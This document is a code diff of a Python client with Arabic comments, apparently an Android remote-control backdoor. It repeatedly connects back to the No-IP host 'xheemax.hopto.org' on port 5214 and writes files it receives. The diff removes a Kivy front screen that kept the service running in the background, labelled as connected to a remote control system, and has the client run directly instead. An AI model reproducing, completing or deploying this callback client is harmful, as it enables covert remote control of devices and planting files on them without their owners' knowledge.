@@ -1,11 +1,10 @@
 import socket
 import os
 import time
-import threading
 
-# ضع رابط No-IP والبورت الخاص بك هنا
-HOST = 'xheemax.hopto.org'  # استبدل هذا برابطك
-PORT = 5214               # البورت المفتوح
+# أبقِ رابط No-IP والبورت الخاص بك هنا
+HOST = 'xheemax.hopto.org'  # تأكد أن رابطك الحقيقي مكتوب هنا
+PORT = 5214
 
 def run_client():
     while True:
@@ -46,19 +45,8 @@ def run_client():
                                 break
                             f.write(data)
             client.close()
-        except:
+        except Exception:
             time.sleep(5)
 
 if __name__ == '__main__':
-    # تشغيل الاتصال في الخلفية
-    threading.Thread(target=run_client, daemon=True).start()
-    
-    # واجهة بسيطة جداً ليبقى التطبيق شغلاً على أندرويد كبرنامج مرئي
-    from kivy.app import App
-    from kivy.uix.label import Label
-    
-    class MyApp(App):
-        def build(self):
-            return Label(text='[ Service Running Background ]\nمتصل بنظام التحكم عن بُعد', font_size=18)
-
-    MyApp().run()
+    run_client()
